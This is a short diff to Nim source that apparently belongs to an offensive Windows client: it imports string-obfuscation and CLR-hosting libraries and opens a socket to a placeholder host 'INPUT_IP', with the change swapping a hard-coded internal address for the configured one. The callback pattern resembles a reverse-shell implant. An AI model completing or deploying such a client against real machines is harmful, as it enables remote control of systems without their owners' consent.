@@ -8,7 +8,7 @@ import strutils
 import strenc
 import strformat
 import winim/clr
-import sugar
+
 
 
 let ip = "INPUT_IP"
@@ -18,7 +18,7 @@ var port = parseInt(patch_port)
 
 var client: net.Socket = newSocket()
 client.connect(ip,  Port(port))
-echo "Trying to connect to: 192.168.1.218:5000"
+echo "Trying to connect to: ",ip,":", port
 
 
 
